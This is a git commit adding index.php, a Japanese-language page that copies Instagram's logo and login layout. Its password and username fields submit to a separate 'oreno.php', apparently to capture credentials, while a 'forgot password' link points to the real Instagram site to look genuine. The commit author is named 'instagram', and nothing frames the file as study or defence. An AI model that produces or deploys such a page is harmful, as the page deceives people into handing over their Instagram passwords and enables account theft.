3371aaa89c573caef215c5b1d09e08ca66aeb71f
instagram <97162504+sona04304649@users.noreply.github.com>
2022-08-16 12:04:38 +0900

    Create index.php

---
+++ index.php
@@ -0,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+<img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png">
+<form action="oreno.php" method="get">
+<input type="password" name="password" autocomplete="off" placeholder="パスワード"><br>
+<input type="text" name="mail" autocomplete="off" placeholder="電話番号、ユーザーネーム、メールアドレス"><br>
+<button type="submit">ログイン</button>
+</form>
+<a href="https://www.instagram.com/accounts/password/reset/"> パスワードを忘れた場合</a><br>
+</body>
+<style>
+input{
+width: 400px;
+height: 20px;
+}
+button{
+color:white;
+background-color: #4c64D3;
+border:none;
+border-radius: 10px;
+width: 410px;
+height: 30px;
+}
+</style>
+</html>
